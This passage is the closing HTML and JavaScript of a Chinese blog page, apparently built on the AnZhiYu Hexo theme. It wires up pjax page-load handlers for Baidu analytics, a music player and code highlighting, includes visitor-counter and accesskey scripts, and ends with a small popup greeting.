  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>